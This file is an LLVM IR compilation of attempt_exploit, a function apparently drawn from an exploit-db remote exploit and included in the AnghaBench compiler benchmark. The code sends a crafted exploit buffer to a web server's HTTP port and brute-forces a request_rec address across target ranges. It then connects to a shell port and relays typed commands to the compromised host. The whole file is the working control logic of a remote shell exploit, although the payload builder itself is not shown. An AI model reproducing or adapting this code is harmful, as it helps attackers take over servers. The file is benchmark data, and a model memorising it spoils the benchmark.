; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/multiple/remote/extr_67.c_attempt_exploit.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/multiple/remote/extr_67.c_attempt_exploit.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_2__ = type { i8*, i64, i64, i32 }

@exactPointerAddy = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [35 x i8] c"[-] Using 0x%08x for pointer addy\0A\00", align 1
@HTTP_PORT = common dso_local global i32 0, align 4
@magic_r = common dso_local global i64 0, align 8
@buf = common dso_local global i8* null, align 8
@SHELL_PORT = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [34 x i8] c"[-] Attempting attack [ %s ] ...\0A\00", align 1
@targets = common dso_local global %struct.TYPE_2__* null, align 8
@useTarget = common dso_local global i64 0, align 8
@MAGIC_R_START = common dso_local global i64 0, align 8
@MAGIC_R_END = common dso_local global i64 0, align 8
@retAddr = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [24 x i8] c"[-] Trying 0x%08x ... \0D\00", align 1
@stdout = common dso_local global i32 0, align 4
@SUCCESS = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [41 x i8] c"\0A[-] Found request_rec address @ 0x%08x\0A\00", align 1
@BRUTE_FORCE_EXHAUSTED = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [49 x i8] c"[-] Connected to %s! You can type commands now:\0A\00", align 1
@host = common dso_local global i8* null, align 8
@SIZ = common dso_local global i64 0, align 8
@.str.5 = private unnamed_addr constant [3 x i8] c"%s\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @attempt_exploit() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = load i32, i32* @exactPointerAddy, align 4
  %7 = icmp ne i32 %6, 0
  br i1 %7, label %8, label %35

8:                                                ; preds = %0
  %9 = load i32, i32* @exactPointerAddy, align 4
  %10 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str, i64 0, i64 0), i32 %9)
  %11 = load i32, i32* @HTTP_PORT, align 4
  %12 = call i32 @connect_to_host(i32 %11)
  store i32 %12, i32* %3, align 4
  %13 = icmp sle i32 %12, 0
  br i1 %13, label %14, label %16

14:                                               ; preds = %8
  %15 = load i32, i32* %3, align 4
  store i32 %15, i32* %1, align 4
  br label %159

16:                                               ; preds = %8
  %17 = load i32, i32* @exactPointerAddy, align 4
  %18 = sext i32 %17 to i64
  store i64 %18, i64* @magic_r, align 8
  %19 = load i8*, i8** @buf, align 8
  %20 = call i32 @make_exploitbuf(i8* %19)
  %21 = load i32, i32* %3, align 4
  %22 = load i8*, i8** @buf, align 8
  %23 = call i32 @my_send(i32 %21, i8* %22)
  %24 = load i32, i32* %3, align 4
  %25 = call i32 @my_recv(i32 %24)
  %26 = load i32, i32* %3, align 4
  %27 = call i32 @close(i32 %26)
  %28 = call i32 @my_sleep(i32 100000)
  %29 = load i32, i32* @SHELL_PORT, align 4
  %30 = call i32 @connect_to_host(i32 %29)
  store i32 %30, i32* %3, align 4
  %31 = icmp sle i32 %30, 0
  br i1 %31, label %32, label %34

32:                                               ; preds = %16
  %33 = load i32, i32* %3, align 4
  store i32 %33, i32* %1, align 4
  br label %159

34:                                               ; preds = %16
  br label %101

35:                                               ; preds = %0
  %36 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %37 = load i64, i64* @useTarget, align 8
  %38 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %36, i64 %37
  %39 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %38, i32 0, i32 0
  %40 = load i8*, i8** %39, align 8
  %41 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.1, i64 0, i64 0), i8* %40)
  %42 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %43 = load i64, i64* @useTarget, align 8
  %44 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %42, i64 %43
  %45 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %44, i32 0, i32 1
  %46 = load i64, i64* %45, align 8
  store i64 %46, i64* @MAGIC_R_START, align 8
  %47 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %48 = load i64, i64* @useTarget, align 8
  %49 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %47, i64 %48
  %50 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %49, i32 0, i32 2
  %51 = load i64, i64* %50, align 8
  store i64 %51, i64* @MAGIC_R_END, align 8
  %52 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %53 = load i64, i64* @useTarget, align 8
  %54 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %52, i64 %53
  %55 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %54, i32 0, i32 3
  %56 = load i32, i32* %55, align 8
  store i32 %56, i32* @retAddr, align 4
  %57 = load i64, i64* @MAGIC_R_START, align 8
  store i64 %57, i64* @magic_r, align 8
  br label %58

58:                                               ; preds = %91, %35
  %59 = load i64, i64* @magic_r, align 8
  %60 = load i64, i64* @MAGIC_R_END, align 8
  %61 = icmp sle i64 %59, %60
  br i1 %61, label %62, label %94

62:                                               ; preds = %58
  %63 = load i64, i64* @magic_r, align 8
  %64 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.2, i64 0, i64 0), i64 %63)
  %65 = load i32, i32* @stdout, align 4
  %66 = call i32 @fflush(i32 %65)
  %67 = load i32, i32* @HTTP_PORT, align 4
  %68 = call i32 @connect_to_host(i32 %67)
  store i32 %68, i32* %3, align 4
  %69 = icmp sle i32 %68, 0
  br i1 %69, label %70, label %72

70:                                               ; preds = %62
  %71 = load i32, i32* %3, align 4
  store i32 %71, i32* %1, align 4
  br label %159

72:                                               ; preds = %62
  %73 = load i8*, i8** @buf, align 8
  %74 = call i32 @make_exploitbuf(i8* %73)
  %75 = load i32, i32* %3, align 4
  %76 = load i8*, i8** @buf, align 8
  %77 = call i32 @my_send(i32 %75, i8* %76)
  %78 = load i32, i32* %3, align 4
  %79 = call i32 @my_recv(i32 %78)
  %80 = load i32, i32* %3, align 4
  %81 = call i32 @close(i32 %80)
  %82 = call i32 @my_sleep(i32 50000)
  %83 = load i32, i32* @SHELL_PORT, align 4
  %84 = call i32 @connect_to_host(i32 %83)
  store i32 %84, i32* %3, align 4
  %85 = load i32, i32* @SUCCESS, align 4
  %86 = icmp sge i32 %84, %85
  br i1 %86, label %87, label %90

87:                                               ; preds = %72
  %88 = load i64, i64* @magic_r, align 8
  %89 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.3, i64 0, i64 0), i64 %88)
  br label %94

90:                                               ; preds = %72
  br label %91

91:                                               ; preds = %90
  %92 = load i64, i64* @magic_r, align 8
  %93 = add nsw i64 %92, 1
  store i64 %93, i64* @magic_r, align 8
  br label %58

94:                                               ; preds = %87, %58
  %95 = load i64, i64* @magic_r, align 8
  %96 = load i64, i64* @MAGIC_R_END, align 8
  %97 = icmp sgt i64 %95, %96
  br i1 %97, label %98, label %100

98:                                               ; preds = %94
  %99 = load i32, i32* @BRUTE_FORCE_EXHAUSTED, align 4
  store i32 %99, i32* %1, align 4
  br label %159

100:                                              ; preds = %94
  br label %101

101:                                              ; preds = %100, %34
  %102 = load i8*, i8** @host, align 8
  %103 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([49 x i8], [49 x i8]* @.str.4, i64 0, i64 0), i8* %102)
  br label %104

104:                                              ; preds = %153, %101
  %105 = call i32 @FD_ZERO(i32* %2)
  %106 = call i32 @FD_SET(i32 0, i32* %2)
  %107 = load i32, i32* %3, align 4
  %108 = call i32 @FD_SET(i32 %107, i32* %2)
  %109 = load i32, i32* %3, align 4
  %110 = add nsw i32 %109, 1
  %111 = call i32 @select(i32 %110, i32* %2, i32* null, i32* null, i32* null)
  store i32 %111, i32* %4, align 4
  %112 = load i32, i32* %4, align 4
  %113 = icmp ne i32 %112, 0
  br i1 %113, label %114, label %146

114:                                              ; preds = %104
  %115 = load i32, i32* %3, align 4
  %116 = call i64 @FD_ISSET(i32 %115, i32* %2)
  %117 = icmp ne i64 %116, 0
  br i1 %117, label %118, label %129

118:                                              ; preds = %114
  %119 = load i8*, i8** @buf, align 8
  %120 = load i32, i32* %3, align 4
  %121 = load i8*, i8** @buf, align 8
  %122 = load i64, i64* @SIZ, align 8
  %123 = sub nsw i64 %122, 1
  %124 = call i32 @recv(i32 %120, i8* %121, i64 %123, i32 0)
  store i32 %124, i32* %5, align 4
  %125 = sext i32 %124 to i64
  %126 = getelementptr inbounds i8, i8* %119, i64 %125
  store i8 0, i8* %126, align 1
  %127 = load i8*, i8** @buf, align 8
  %128 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i8* %127)
  br label %129

129:                                              ; preds = %118, %114
  %130 = call i64 @FD_ISSET(i32 0, i32* %2)
  %131 = icmp ne i64 %130, 0
  br i1 %131, label %132, label %145

132:                                              ; preds = %129
  %133 = load i8*, i8** @buf, align 8
  %134 = load i8*, i8** @buf, align 8
  %135 = load i64, i64* @SIZ, align 8
  %136 = sub nsw i64 %135, 1
  %137 = call i32 @read(i32 0, i8* %134, i64 %136)
  store i32 %137, i32* %5, align 4
  %138 = sext i32 %137 to i64
  %139 = getelementptr inbounds i8, i8* %133, i64 %138
  store i8 0, i8* %139, align 1
  %140 = load i32, i32* %3, align 4
  %141 = load i8*, i8** @buf, align 8
  %142 = load i8*, i8** @buf, align 8
  %143 = call i32 @strlen(i8* %142)
  %144 = call i32 @send(i32 %140, i8* %141, i32 %143, i32 0)
  br label %145

145:                                              ; preds = %132, %129
  br label %146

146:                                              ; preds = %145, %104
  br label %147

147:                                              ; preds = %146
  %148 = load i32, i32* %4, align 4
  %149 = icmp ne i32 %148, 0
  br i1 %149, label %150, label %153

150:                                              ; preds = %147
  %151 = load i32, i32* %5, align 4
  %152 = icmp ne i32 %151, 0
  br label %153

153:                                              ; preds = %150, %147
  %154 = phi i1 [ false, %147 ], [ %152, %150 ]
  br i1 %154, label %104, label %155

155:                                              ; preds = %153
  %156 = load i32, i32* %3, align 4
  %157 = call i32 @close(i32 %156)
  %158 = load i32, i32* @SUCCESS, align 4
  store i32 %158, i32* %1, align 4
  br label %159

159:                                              ; preds = %155, %98, %70, %32, %14
  %160 = load i32, i32* %1, align 4
  ret i32 %160
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @connect_to_host(i32) #1

declare dso_local i32 @make_exploitbuf(i8*) #1

declare dso_local i32 @my_send(i32, i8*) #1

declare dso_local i32 @my_recv(i32) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @my_sleep(i32) #1

declare dso_local i32 @fflush(i32) #1

declare dso_local i32 @FD_ZERO(i32*) #1

declare dso_local i32 @FD_SET(i32, i32*) #1

declare dso_local i32 @select(i32, i32*, i32*, i32*, i32*) #1

declare dso_local i64 @FD_ISSET(i32, i32*) #1

declare dso_local i32 @recv(i32, i8*, i64, i32) #1

declare dso_local i32 @read(i32, i8*, i64) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @strlen(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
